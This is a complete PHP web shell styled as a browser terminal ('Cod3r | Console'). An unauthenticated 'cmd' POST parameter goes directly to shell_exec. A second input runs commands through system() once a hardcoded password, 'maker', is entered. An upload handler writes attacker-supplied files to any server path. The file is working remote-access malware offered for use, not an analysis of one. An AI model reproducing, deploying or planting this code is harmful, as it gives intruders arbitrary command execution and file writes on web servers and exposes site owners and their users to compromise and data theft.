<?php
if(!isset($_SESSION)) session_start();
$_SESSION = json_decode(json_encode($_SESSION),true);
if(!isset($_SESSION['loggedIn'])) $_SESSION['loggedIn'] = false; 
if (ISSET($_POST['cmd'])) {
    $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
    foreach ($output as $line) {
        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
    }
    die(); 
} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
    $filename = $_FILES["file"]["name"];
    $path = $_POST['path'];
    if ($path != "/") {
        $path .= "/";
    } 
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
        echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
    } else {
        echo "Error uploading " . htmlentities($filename);
    }
    die();
}
$host = php_uname('n');
$name = 'www-data';
define('HOST',$host);
define('NAME',$name);
function getUserNameElement($float = true) {
	$dir = getcwd();
	$host = HOST;
	$name = NAME;
	return "<div style='color: #ff0000;" . ($float ? "float: left;" : "display: inline;"). "'>{$name}@{$host}</div>:{$dir}".'$ ';
}
function disable_ob() {
    // Turn off output buffering
    ini_set('output_buffering', 'off');
    // Turn off PHP output compression
    ini_set('zlib.output_compression', false);
    // Implicitly flush the buffer(s)
    ini_set('implicit_flush', true);
    ob_implicit_flush(true);
    // Clear, and turn off output buffering
    while (ob_get_level() > 0) {
        // Get the curent level
        $level = ob_get_level();
        // End the buffering
        ob_end_clean();
        // If the current level has not changed, abort
        if (ob_get_level() == $level) break;
    }
    // Disable apache output buffering/compression
    if (function_exists('apache_setenv')) {
        apache_setenv('no-gzip', '1');
        apache_setenv('dont-vary', '1');
    }
}
if(isset($_POST['command'])) {
if(!$_SESSION['loggedIn']) {
	if(htmlentities($_POST['command']) == 'maker')
	$_SESSION['loggedIn'] = true;
	else
	$_POST['command'] = "";
}
	disable_ob();
}
?>

<html>
    <head>
        <title>Cod3r | Console</title>
		<script src="../static/notcrap.js"></script>
		<link rel="stylesheet" href="../static/style.css">
        <style>
            html, body {
                max-width: 100%;
            }
        
            body {
                width: 100%;
                height: 100%;
                margin: 0;
                background: #000;
            }
            
            body, .inputtext {
                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                font-size: 14px;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                line-height: 20px;
                overflow: hidden;
            }
        
            .console {
                width: 100%;
                height: 100%;
                margin: auto;
                position: absolute;
                color: #fff;
            }
            
            .output {
                width: auto;
                height: auto;
                position: absolute;
                overflow-y: scroll;
                top: 0;
                bottom: 30px;
                left: 5px;
                right: 0;
                line-height: 20px;
            }
                                 
            .input form {
                position: relative;
                margin-bottom: 0px;
            }
                     
            .username {
                height: 30px;
                width: auto;
                padding-left: 5px;
                line-height: 30px;
                float: left;
            }
            .input {
                border-top: 1px solid #333333;
                width: 100%;
                height: 30px;
                position: absolute;
                bottom: 0;
            }
            .inputtext {
                width: auto;
                height: 30px;
                bottom: 0px;
                margin-bottom: 0px;
                background: #000;
                border: 0;
                float: left;
                padding-left: 8px;
                color: #fff;
            }
            
            .inputtext:focus {
                outline: none;
            }
            ::-webkit-scrollbar {
                width: 12px;
            }
            ::-webkit-scrollbar-track {
                background: #101010;
            }
            ::-webkit-scrollbar-thumb {
                background: #303030; 
            }
        </style>
    </head>
    <body>
        <div class="console">
            <div class="output" id="output">
			<?php if(isset($_POST['outputData'])) echo $_POST['outputData'];?>
			<?php if(isset($_POST['command'])&&!empty($_POST['command'])) {
				disable_ob();
				echo getUserNameElement() . htmlentities($_POST['command']) . "<br>\n";
				$command = $_POST['command'];
				$r = @system($command);
			} ?>
			</div>
            <div class="input" id="input">
                <form id="form" method="POST">
                    <div class="username" id="username">
					<?php echo getUserNameElement(false);?>
					</div>
                   <textarea name="outputData" style="display:none" id="outD"><?php 
				   if(isset($_POST['outputData'])) {
				   $res = htmlentities($_POST['outputData']);
				   $res .= getUserNameElement() . htmlentities($_POST['command']) . "<br>\n" . $r;
				   echo $res;
				   }
				   ?></textarea>
				   <input class="inputtext" id="inputtext" type="text" name="command" autocomplete="off" autofocus>
                </form>
            </div>
        </div>
        <form id="upload" method="POST" style="display: none;">
            <input type="file" name="file" id="filebrowser" onchange='uploadFile()' />
        </form>
        <script type="text/javascript">
            var username = `<?php echo $name;?>`;
            var hostname = `<?php echo $host;?>`;
            var currentDir = `<?php echo getcwd();?>`;
            var previousDir = "";
            var defaultDir = `<?php echo $_SERVER['DOCUMENT_ROOT']; ?>`;
            var commandHistory = [];
            var currentCommand = 0;
            var inputTextElement = get('#inputtext');
            var inputElement = get("#input");
            var outputElement = get("#output");
            var usernameElement = get("#username");
            var uploadFormElement = get("#upload");
            var fileBrowserElement = get("#filebrowser");
			var txtArea = get('#outD');
            updateInputWidth();
            
                        
            function sendCommand() {
                var command = inputTextElement.value;
                var originalCommand = command;
                var originalDir = currentDir;
                var cd = false;
                
                commandHistory.push(originalCommand);
                switchCommand(commandHistory.length);
                inputTextElement.value = "";
                var parsedCommand = command.split(" ");
                
                if (parsedCommand[0] == "cd") {
                    cd = true;
                    if (parsedCommand.length == 1) {
                        outputElement.innerHTML += getUserEl() + currentDir + "<br>";
						return;
                    } else if (parsedCommand[1] == "-") {
                        command = "cd "+previousDir+"; pwd";
                    } else {
                        command = "cd "+currentDir+"; "+command+"; pwd";
                    }
                    
                } else if (parsedCommand[0] == "clear") {
                    outputElement.innerHTML = "";
                    return false;
                } else if (parsedCommand[0] == "upload") {
                    fileBrowserElement.click();
                    return false;
                } else {
                    command = "cd "+currentDir+"; " + command;
					inputTextElement.value = command;
					get("#form").submit();
					return;
                }
                
                ajax({
					method:"POST",
					data:{cmd: command}
				}, function() {
                            var parsedResponse = request.responseText.split("<br>");
                            previousDir = currentDir;
                            currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'><?php echo $name;?>@<?php echo $host;?></div><div style='float: left;'>"+":"+originalDir+"$ "+originalCommand+"</div><br>";
                            usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'><?php echo $name;?>@<?php echo $host;?></div>:"+currentDir+"$ ";

                        updateInputWidth();
                });
				txtArea.value += outputElement.innerHTML;
            }
            
            function updateInputWidth() {
                inputTextElement.style.width = window.innerWidth - usernameElement.clientWidth - 15;
            }
            
            document.onkeydown = checkForArrowKeys;
            function checkForArrowKeys(e) {
                e = e || window.event;
                if (e.keyCode == '38') {
                    previousCommand();
                } else if (e.keyCode == '40') {
                    nextCommand();
                }
            }
            
            function previousCommand() {
                if (currentCommand != 0) {
                    switchCommand(currentCommand-1);
                }
            }
            
            function nextCommand() {
                if (currentCommand != commandHistory.length) {
                    switchCommand(currentCommand+1);
                }
            }
            
            function switchCommand(newCommand) {
                currentCommand = newCommand;
                if (currentCommand == commandHistory.length) {
                    inputTextElement.value = "";
                } else {
                    inputTextElement.value = commandHistory[currentCommand];
                    setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
                }
            }
            
            get("#form").addEventListener("submit", function(event){
                event.preventDefault();
				sendCommand();
            });
        </script>
    </body>
</html>